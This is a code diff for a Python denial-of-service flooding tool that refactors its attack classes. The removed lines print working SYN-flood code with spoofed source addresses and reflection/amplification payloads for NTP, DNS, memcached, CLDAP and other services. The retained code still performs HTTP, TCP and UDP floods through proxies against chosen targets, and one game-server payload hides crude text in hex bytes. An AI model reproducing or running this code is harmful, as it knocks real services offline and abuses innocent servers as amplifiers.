@@ -1,43 +1,34 @@
 import asyncio
-import random
-from contextlib import suppress
-from copy import copy
 import errno
+import random
+import socket as _socket
+from copy import copy
 from functools import partial
-from itertools import cycle
-import logging
 from math import log2, trunc
 from os import urandom as randbytes
 from random import choice
 from secrets import choice as randchoice
-from socket import (
-    AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
-    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket, inet_ntoa
-)
-import socket as _socket
+from socket import (AF_INET, SOCK_DGRAM, inet_ntoa, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
-from sys import exit as _exit
-from threading import Event
-from time import time
-from typing import Any, Callable, List, Optional, Set, Tuple
-from urllib import parse
 from string import ascii_letters
 from struct import pack as data_pack
+from threading import Event
+from time import time
+from typing import Callable, List, Optional, Set, Tuple
+from urllib import parse
 
 import aiohttp
 from async_timeout import timeout
 from yarl import URL
 
-from .ImpactPacket import IP, TCP, UDP, Data
-from .core import cl, logger
-from .proxies import ProxySet, NoProxySet
-
 from . import proxy_proto
+from .core import logger
 from .proto import FloodIO, FloodOp, FloodSpec, FloodSpecType
+from .proxies import NoProxySet, ProxySet
 from .referers import REFERERS
-from .useragents import USERAGENTS
-from .rotate import suffix as rotate_suffix, params as rotate_params
+from .rotate import params as rotate_params, suffix as rotate_suffix
 from .targets import TargetStats
+from .useragents import USERAGENTS
 
 
 USERAGENTS = list(USERAGENTS)
@@ -56,41 +47,22 @@ except AttributeError:
 ctx.verify_mode = CERT_NONE
 ctx.set_ciphers("DEFAULT")
 
-SOCK_TIMEOUT = 8
-
-
-def exit(*message):
-    if message:
-        logger.error(cl.RED + " ".join(message) + cl.RESET)
-    logging.shutdown()
-    _exit(1)
-
 
 class Methods:
-    LAYER7_METHODS: Set[str] = {
+    HTTP_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "AVB",
-        "APACHE", "XMLRPC", "DOWNLOADER", "TCP"
+        "APACHE", "XMLRPC", "DOWNLOADER"
     }
-
-    LAYER4_METHODS: Set[str] = {
+    TCP_METHODS: Set[str] = {"TCP"}
+    UDP_METHODS: Set[str] = {
         "UDP", "VSE", "FIVEM", "TS3", "MCPE",
-        # the following methods are temporarily disabled
-        # for further investiation and testing
-        # "SYN",  "MEM", "NTP", "DNS", "ARD",
-        # "CHAR", "RDP", "CPS",  "CLDAP"
+        # the following methods are temporarily disabled for further investigation and testing
+        # "SYN", "CPS",
+        # Amplification
+        # "ARD", "CHAR", "RDP", "CLDAP", "MEM", "DNS", "NTP"
     }
-    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
-
-
-google_agents = [
-    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
-    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
-    "+http://www.google.com/bot.html)) "
-    "Googlebot/2.1 (+http://www.google.com/bot.html)",
-    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
-]
+    ALL_METHODS: Set[str] = {*HTTP_METHODS, *UDP_METHODS, *TCP_METHODS}
 
 
 class Tools:
@@ -122,18 +94,6 @@ class Tools:
         return (url, ip), proxies
 
     @staticmethod
-    def sendto(sock, packet, target, stats: TargetStats):
-        if not sock.sendto(packet, target):
-            return False
-        stats.track(1, len(packet))
-        return True
-
-    @staticmethod
-    def safe_close(sock=None):
-        if sock:
-            sock.close()
-
-    @staticmethod
     def rand_str(length=16):
         return ''.join(random.choices(ascii_letters, k=length))
 
@@ -142,191 +102,6 @@ class Tools:
         return inet_ntoa(
             data_pack('>I', random.randint(1, 0xffffffff))
         )
-
-
-# noinspection PyBroadException,PyUnusedLocal
-class Layer4:
-    _method: str
-    _target: Tuple[str, int]
-    _ref: Any
-    SENT_FLOOD: Any
-    _amp_payloads = cycle
-
-    def __init__(
-        self,
-        target: Tuple[str, int],
-        ref: List[str],
-        method: str,
-        event: Event,
-        proxies: ProxySet,
-        stats: TargetStats,
-    ):
-        self._amp_payload = None
-        self._amp_payloads = cycle([])
-        self._ref = ref
-        self._method = method
-        self._target = target
-        self._event = event
-        self._stats = stats
-        self._proxies = proxies
-        self.select(self._method)
-
-    def run(self) -> int:
-        return self.SENT_FLOOD()
-
-    def open_connection(self,
-                        conn_type=AF_INET,
-                        sock_type=SOCK_STREAM,
-                        proto_type=IPPROTO_TCP):
-        sock = self._get_proxy().open_socket(conn_type, sock_type, proto_type)
-        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        sock.settimeout(SOCK_TIMEOUT)
-        sock.connect(self._target)
-        return sock
-
-    def select(self, name):
-        self.SENT_FLOOD = self.UDP
-        if name == "UDP": self.SENT_FLOOD = self.UDP
-        if name == "SYN": self.SENT_FLOOD = self.SYN
-        if name == "VSE": self.SENT_FLOOD = self.VSE
-        if name == "TS3": self.SENT_FLOOD = self.TS3
-        if name == "MCPE": self.SENT_FLOOD = self.MCPE
-        if name == "FIVEM": self.SENT_FLOOD = self.FIVEM
-        if name == "CPS": self.SENT_FLOOD = self.CPS
-        if name == "RDP":
-            self._amp_payload = (
-                b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
-                3389
-            )
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "CLDAP":
-            self._amp_payload = (
-                b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
-                b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
-                389
-            )
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "MEM":
-            self._amp_payload = (
-                b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "CHAR":
-            self._amp_payload = (b'\x01', 19)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "ARD":
-            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "NTP":
-            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-        if name == "DNS":
-            self._amp_payload = (
-                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
-                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
-                53)
-            self.SENT_FLOOD = self.AMP
-            self._amp_payloads = cycle(self._generate_amp())
-
-    def CPS(self) -> int:
-        s, packets = None, 0
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            self._stats.track(1, 0)
-            packets += 1
-        Tools.safe_close(s)
-        return packets
-
-    def SYN(self) -> int:
-        payload = self._generate_syn()
-        s, packets = None, 0
-        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
-            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, payload, self._target, self._stats):
-                packets += 1
-        Tools.safe_close(s)
-        return packets
-
-    def AMP(self) -> int:
-        s, packets = None, 0
-        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
-            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, *next(self._amp_payloads), self._target, self._stats):
-                packets += 1
-        Tools.safe_close(s)
-        return packets
-
-    def VSE(self) -> int:
-        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
-                   b'\x20\x51\x75\x65\x72\x79\x00')
-        s, packets = None, 0
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target, self._stats):
-                packets += 1
-        Tools.safe_close(s)
-        return packets
-
-    def FIVEM(self) -> int:
-        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
-        s, packets = None, 0
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target, self._stats):
-                packets += 1
-        Tools.safe_close(s)
-        return packets
-
-    def TS3(self) -> int:
-        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
-        s, packets = None, 0
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target, self._stats):
-                packets += 1
-        Tools.safe_close(s)
-        return packets
-
-    def MCPE(self) -> int:
-        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
-                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
-                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
-                   b'\x73')
-        s, packets = None, 0
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target, self._stats):
-                packets += 1
-        Tools.safe_close(s)
-        return packets
-
-    def _generate_syn(self) -> bytes:
-        ip: IP = IP()
-        ip.set_ip_src(Tools.rand_ipv4())
-        ip.set_ip_dst(self._target[0])
-        tcp: TCP = TCP()
-        tcp.set_SYN()
-        tcp.set_th_dport(self._target[1])
-        tcp.set_th_sport(random.randint(1, 65535))
-        ip.contains(tcp)
-        return ip.get_packet()
-
-    def _generate_amp(self):
-        payloads = []
-        for ref in self._ref:
-            ip: IP = IP()
-            ip.set_ip_src(self._target[0])
-            ip.set_ip_dst(ref)
-
-            ud: UDP = UDP()
-            ud.set_uh_dport(self._amp_payload[1])
-            ud.set_uh_sport(self._target[1])
-
-            ud.contains(Data(self._amp_payload[0]))
-            ip.contains(ud)
-
-            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
-        return payloads
 
 
 def request_info_size(request: aiohttp.RequestInfo) -> int:
@@ -349,8 +124,8 @@ class AttackSettings:
     def __init__(
         self,
         *,
-        connect_timeout_seconds: float = SOCK_TIMEOUT,
-        dest_connect_timeout_seconds: float = SOCK_TIMEOUT,
+        connect_timeout_seconds: float = 8,
+        dest_connect_timeout_seconds: float = 8,
         drain_timeout_seconds: float = 5.0,
         close_timeout_seconds: float = 1.0,
         http_response_timeout_seconds: float = 15.0,
@@ -731,7 +506,6 @@ class AsyncTcpFlood:
     async def DOWNLOADER(self, on_connect=None) -> bool:
         packet: bytes = self.generate_payload()
         packet_size: int = len(packet)
-        delay: float = self._settings.requests_per_connection / 15
 
         def _gen():
             for _ in range(self._settings.requests_per_connection):
@@ -755,12 +529,30 @@ class AsyncTcpFlood:
             FloodSpecType.CALLABLE, partial(randbytes, packet_size), on_connect)
 
 
-class AsyncUdpFlood(Layer4):
-
-    def __init__(self, *args, loop=None, settings: Optional[AttackSettings] = None):
-        super().__init__(*args)
+class AsyncUdpFlood:
+    def __init__(
+        self,
+        target: Tuple[str, int],
+        method: str,
+        event: Event,
+        proxies: ProxySet,
+        stats: TargetStats,
+        loop=None,
+        settings: Optional[AttackSettings] = None,
+    ):
+        self.SENT_FLOOD = None
+        self._method = method
+        self._target = target
+        self._event = event
+        self._stats = stats
+        self._proxies = proxies
         self._loop = loop
         self._settings = settings or AttackSettings()
+
+        self.select(self._method)
+
+    def select(self, name: str) -> None:
+        self.SENT_FLOOD = getattr(self, name)
 
     async def run(self) -> bool:
         assert self._loop is not None, "Event loop has to be set to run async flooder"
@@ -820,10 +612,10 @@ class AsyncUdpFlood(Layer4):
 
 def main(url, ip, method, event, proxies, stats, loop=None, settings=None):
     if method not in Methods.ALL_METHODS:
-        exit(f"Method {method} Not Found")
+        raise RuntimeError(f"Method {method} Not Found")
 
     (url, ip), proxies = Tools.parse_params(url, ip, proxies)
-    if method in Methods.LAYER7_METHODS:
+    if method in Methods.TCP_METHODS:
         return AsyncTcpFlood(
             url,
             ip,
@@ -837,12 +629,12 @@ def main(url, ip, method, event, proxies, stats, loop=None, settings=None):
             settings=settings,
         )
 
-    if method in Methods.LAYER4_METHODS:
+    if method in Methods.UDP_METHODS:
         port = url.port
 
         # XXX: move this test to targets parser
         if port > 65535 or port < 1:
-            exit("Invalid Port [Min: 1 / Max: 65535] ")
+            raise RuntimeError("Invalid Port [Min: 1 / Max: 65535]")
 
         if not port:
             logger.warning("Port Not Selected, Set To Default: 80")
@@ -850,7 +642,6 @@ def main(url, ip, method, event, proxies, stats, loop=None, settings=None):
 
         return AsyncUdpFlood(
             (ip, port),
-            None,  # XXX: previously used for "ref"
             method,
             event,
             proxies,
